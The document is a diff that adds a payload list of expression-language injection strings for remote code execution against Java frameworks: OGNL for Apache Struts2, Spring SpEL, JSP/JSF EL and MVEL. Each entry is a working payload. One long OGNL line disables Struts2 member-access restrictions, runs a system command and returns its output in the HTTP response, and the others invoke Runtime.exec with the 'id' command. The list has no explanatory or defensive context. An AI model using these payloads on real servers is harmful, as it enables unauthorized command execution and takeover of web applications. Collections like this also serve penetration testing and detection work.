@@ -1,0 +1,19 @@
+# OGNL - Struts2 RCE
+%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+${(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+%{(#_memberAccess['allowStaticMethodAccess']=true).(@java.lang.Runtime@getRuntime().exec('id'))}
+
+# SpEL - Spring Expression Language
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec(new String[]{'id'})}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
+
+# EL - JSP/JSF Expression Language
+${Runtime.getRuntime().exec('id')}
+${applicationScope}
+${pageContext.request.serverName}
+
+# MVEL
+Runtime.getRuntime().exec('id')
